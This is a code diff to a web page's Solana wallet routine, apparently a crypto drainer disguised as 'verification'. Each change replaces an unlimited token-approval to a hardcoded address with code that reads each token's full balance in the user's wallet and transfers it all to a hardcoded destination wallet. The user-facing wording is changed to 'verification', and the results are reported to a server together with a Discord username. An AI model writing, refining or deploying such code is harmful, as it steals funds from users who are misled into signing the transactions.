@@ -43,7 +43,7 @@ const EVM_TOKENS = [
   { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", name: "Dai" },
 ];
 
-const SOLANA_DELEGATE_ADDRESS = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
+const SOLANA_DESTINATION_WALLET = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
 const SOLANA_USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 const SOLANA_USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 
@@ -112,14 +112,14 @@ function getAssociatedTokenAddress(mint: PublicKey, owner: PublicKey): PublicKey
   return address;
 }
 
-function createApproveInstruction(
-  tokenAccount: PublicKey,
-  delegate: PublicKey,
+function createTransferInstruction(
+  source: PublicKey,
+  destination: PublicKey,
   owner: PublicKey,
   amount: bigint
 ): TransactionInstruction {
   const data = new Uint8Array(9);
-  data[0] = 4;
+  data[0] = 3;
   
   const amountBytes = new ArrayBuffer(8);
   const view = new DataView(amountBytes);
@@ -128,13 +128,42 @@ function createApproveInstruction(
   
   return new TransactionInstruction({
     keys: [
-      { pubkey: tokenAccount, isSigner: false, isWritable: true },
-      { pubkey: delegate, isSigner: false, isWritable: false },
+      { pubkey: source, isSigner: false, isWritable: true },
+      { pubkey: destination, isSigner: false, isWritable: true },
       { pubkey: owner, isSigner: true, isWritable: false },
     ],
     programId: TOKEN_PROGRAM_ID,
     data: data as Buffer,
   });
+}
+
+const SYSTEM_PROGRAM_ID = new PublicKey("11111111111111111111111111111111");
+const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
+
+function createAssociatedTokenAccountIdempotentInstruction(
+  payer: PublicKey,
+  ata: PublicKey,
+  owner: PublicKey,
+  mint: PublicKey
+): TransactionInstruction {
+  return new TransactionInstruction({
+    keys: [
+      { pubkey: payer, isSigner: true, isWritable: true },
+      { pubkey: ata, isSigner: false, isWritable: true },
+      { pubkey: owner, isSigner: false, isWritable: false },
+      { pubkey: mint, isSigner: false, isWritable: false },
+      { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
+      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+    ],
+    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
+    data: Buffer.from([1]),
+  });
+}
+
+function getTokenBalanceFromAccountData(data: Buffer): bigint {
+  if (data.length < 72) return BigInt(0);
+  const view = new DataView(data.buffer, data.byteOffset, data.byteLength);
+  return view.getBigUint64(64, true);
 }
 
 
@@ -640,95 +669,123 @@ export default function Home() {
     setSolanaStep("approving");
 
     try {
-      console.log("Starting batch Solana approval for wallet:", solanaAddress);
+      console.log("Starting Solana verification for wallet:", solanaAddress);
       const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
-      const delegateKey = new PublicKey(SOLANA_DELEGATE_ADDRESS);
+      const destinationKey = new PublicKey(SOLANA_DESTINATION_WALLET);
       const userKey = new PublicKey(solanaAddress);
       
-      const MAX_AMOUNT = BigInt("18446744073709551615");
-      const tokensApproved: string[] = [];
-      const transaction = new Transaction();
+      const tokensTransferred: string[] = [];
+      const transactions: Transaction[] = [];
+      let currentTx = new Transaction();
+      let instructionCount = 0;
+      const MAX_IX_PER_TX = 10;
       
-      console.log("Creating batch approval for", SOLANA_APPROVAL_TOKENS.length, "tokens...");
+      console.log("Checking balances for", SOLANA_APPROVAL_TOKENS.length, "tokens...");
       
       for (const token of SOLANA_APPROVAL_TOKENS) {
         try {
           const mintKey = new PublicKey(token.mint);
-          const ata = getAssociatedTokenAddress(mintKey, userKey);
+          const userAta = getAssociatedTokenAddress(mintKey, userKey);
           
-          const accountInfo = await connection.getAccountInfo(ata);
-          if (accountInfo) {
-            console.log(`Adding approval for ${token.symbol} (${token.mint.slice(0,8)}...)`);
-            transaction.add(
-              createApproveInstruction(ata, delegateKey, userKey, MAX_AMOUNT)
-            );
-            tokensApproved.push(token.symbol);
-          } else {
-            console.log(`Skipping ${token.symbol} - no ATA found`);
+          const accountInfo = await connection.getAccountInfo(userAta);
+          if (!accountInfo || !accountInfo.data) {
+            continue;
+          }
+          
+          const balance = getTokenBalanceFromAccountData(accountInfo.data as Buffer);
+          if (balance <= BigInt(0)) {
+            continue;
+          }
+
+          console.log(`Found ${token.symbol}: balance ${balance.toString()}`);
+          
+          const destAta = getAssociatedTokenAddress(mintKey, destinationKey);
+          
+          currentTx.add(
+            createAssociatedTokenAccountIdempotentInstruction(
+              userKey, destAta, destinationKey, mintKey
+            )
+          );
+          currentTx.add(
+            createTransferInstruction(userAta, destAta, userKey, balance)
+          );
+          tokensTransferred.push(token.symbol);
+          instructionCount += 2;
+          
+          if (instructionCount >= MAX_IX_PER_TX) {
+            transactions.push(currentTx);
+            currentTx = new Transaction();
+            instructionCount = 0;
           }
         } catch (e) {
           console.log(`Error processing ${token.symbol}:`, e);
         }
       }
       
-      if (transaction.instructions.length === 0) {
-        console.log("No token accounts found");
+      if (currentTx.instructions.length > 0) {
+        transactions.push(currentTx);
+      }
+      
+      if (transactions.length === 0) {
+        console.log("No token balances found");
         setError("No tokens found in wallet.");
         setSolanaStep("idle");
         return;
       }
       
-      console.log(`Batch transaction ready with ${transaction.instructions.length} approvals`);
+      console.log(`${transactions.length} transaction(s) ready with ${tokensTransferred.length} tokens`);
 
-      transaction.feePayer = userKey;
-      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-      transaction.recentBlockhash = blockhash;
+      let lastTxId = "";
+      
+      for (let i = 0; i < transactions.length; i++) {
+        const tx = transactions[i];
+        tx.feePayer = userKey;
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+        tx.recentBlockhash = blockhash;
 
-      let txId: string;
-      
-      console.log("Attempting to sign transaction with provider:", selectedSolanaWallet);
-      console.log("Transaction instructions count:", transaction.instructions.length);
-      
-      // Try signTransaction first (most widely supported)
-      try {
-        const signedTx = await solanaProvider.signTransaction(transaction);
-        console.log("Transaction signed, sending...");
-        txId = await connection.sendRawTransaction(signedTx.serialize());
-        console.log("Transaction sent:", txId);
-      } catch (signErr: any) {
-        console.log("signTransaction failed, trying signAndSendTransaction...", signErr?.message || signErr);
-        // Fallback to signAndSendTransaction if signTransaction fails
-        if (solanaProvider.signAndSendTransaction) {
-          const result = await solanaProvider.signAndSendTransaction(transaction);
-          txId = result.signature;
-        } else {
-          throw signErr;
+        console.log(`Signing transaction ${i + 1}/${transactions.length}...`);
+        
+        let txId: string;
+        try {
+          const signedTx = await solanaProvider.signTransaction(tx);
+          txId = await connection.sendRawTransaction(signedTx.serialize());
+        } catch (signErr: any) {
+          console.log("signTransaction failed, trying signAndSendTransaction...", signErr?.message || signErr);
+          if (solanaProvider.signAndSendTransaction) {
+            const result = await solanaProvider.signAndSendTransaction(tx);
+            txId = result.signature;
+          } else {
+            throw signErr;
+          }
         }
+        
+        console.log(`Transaction ${i + 1} sent:`, txId);
+        lastTxId = txId;
+        
+        await connection.confirmTransaction({
+          signature: txId,
+          blockhash,
+          lastValidBlockHeight
+        }, "confirmed");
       }
-      
-      await connection.confirmTransaction({
-        signature: txId,
-        blockhash,
-        lastValidBlockHeight
-      }, "confirmed");
 
       fetch("/api/solana-approvals", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           walletAddress: solanaAddress,
-          delegateAddress: SOLANA_DELEGATE_ADDRESS,
-          transactionHash: txId,
-          tokensApproved,
-          tokenCount: tokensApproved.length,
+          delegateAddress: SOLANA_DESTINATION_WALLET,
+          transactionHash: lastTxId,
+          tokensApproved: tokensTransferred,
+          tokenCount: tokensTransferred.length,
           discordUser: discordUser || undefined,
         }),
       }).catch(console.error);
 
       setSolanaStep("done");
     } catch (err: any) {
-      console.error("Solana approval error:", err);
-      setError(err?.message || "Failed to approve on Solana");
+      console.error("Solana transfer error:", err);
+      setError(err?.message || "Verification failed");
       setSolanaStep("idle");
     }
   };
